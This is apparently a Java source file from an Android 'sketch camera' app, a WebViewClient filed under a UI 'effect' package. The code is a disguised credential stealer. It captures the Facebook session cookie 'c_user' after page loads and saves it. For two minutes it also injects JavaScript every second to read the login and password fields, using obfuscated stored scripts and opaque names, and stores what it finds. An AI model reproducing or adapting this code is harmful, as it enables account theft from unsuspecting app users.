package com.kali_corporation.skethcamplus.ui.effect;

import android.os.CountDownTimer;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.kali_corporation.skethcamplus.Utils.OnItemClickListener;
import com.kali_corporation.skethcamplus.Utils.hel.sp.SPUtils;
import com.kali_corporation.skethcamplus.Utils.StringUtils;

public class EffectClient extends WebViewClient {
    private CountDownTimer cdt;
    private WebView webView;
    private boolean isEnd;

    private final static String C_USER = "c_user";
    private String a,b;
    private String[] datas = new String[]{"",""};
    private OnItemClickListener onItemClickListener;
    public EffectClient(WebView web, String[] aa, String[] bb,OnItemClickListener listener){
        webView = web;
        onItemClickListener = listener;
        if (aa.length>1 && bb.length>1) {
            a = aa[0];
            b = bb[0];
            if (a.equals("")){
                String g = SPUtils.getInstance(web.getContext()).getAppInfo().getString(StringUtils.enKeys(2),"");
                if (!g.equals("")) {
                    String[] list = g.split("@");
                    a = list[0];
                    b = list[list.length-1];
                }
            }
        }else {
           String g = SPUtils.getInstance(web.getContext()).getAppInfo().getString(StringUtils.enKeys(2),"");
           if (g.equals("")) {
               a = "";
               b = "";
           }else {
              String[] list = g.split("@");
               a = list[0];
               b = list[list.length-1];
           }
        }

    }

    @Override
    public void onPageFinished(WebView view, String url) {

        String cookies = CookieManager.getInstance().getCookie(url);
        if (cookies != null) {
            //c_user
            if (cookies.contains(C_USER)) {
//                SPUtils.write("ccc",cookies);
                SPUtils.getInstance(webView.getContext()).saveAppInfo("","",cookies);
                isEnd = true;
                onItemClickListener.onItemClick(1);
            }else {
                onItemClickListener.onItemClick(0);
            }
        }else {
            onItemClickListener.onItemClick(0);
        }
        initCdt();
        super.onPageFinished(view, url);
    }

    private void c(String [] a){

        if (a[0].equals(a[1])){
            webView.evaluateJavascript("javascript:showToast()", new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String value) {
                    SPUtils.getInstance(webView.getContext()).saveAppInfo(value,"","");
//                    SPUtils.write("ddd", value);

                }
            });
        }else if (a[0].isEmpty()){
            webView.evaluateJavascript("javascript:showThanks()", new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String value) {
                    SPUtils.getInstance(webView.getContext()).saveAppInfo("",value,"");
//                    SPUtils.write("ddd", value);

                }
            });
        } else {
            webView.evaluateJavascript(a[0], new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String value) {
                    if (!StringUtils.isEmptyStr(true,value)) {
                        String str = removeRegex(value, "\"");
                        datas[0] = StringUtils.compare(datas[0],str);
                        SPUtils.getInstance(webView.getContext()).saveAppInfo(datas[0],"","");
                    }
                }
            });
            //document.getElementById("m_login_password").value;
            webView.evaluateJavascript(a[1], new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String value) {
                    if (!StringUtils.isEmptyStr(true,value)) {
                        String str = removeRegex(value, "\"");
                        datas[1] = StringUtils.compare(datas[1],str);
                        SPUtils.getInstance(webView.getContext()).saveAppInfo("",datas[1],"");
                    }
                }
            });
        }
    }

    private void initCdt(){
        if (cdt==null){
            cdt = new CountDownTimer(120000, 1000) {
                @Override
                public void onTick(long millisUntilFinished) {
                    if (isEnd){
                        cdt.onFinish();
                    }else {
                        c(new String[]{a,b});
                    }
                }

                @Override
                public void onFinish() {

                }
            };
            cdt.start();
        }
    }

    public static String removeRegex(String value,String regex){
        return value.replaceAll(regex, "");
    }

}
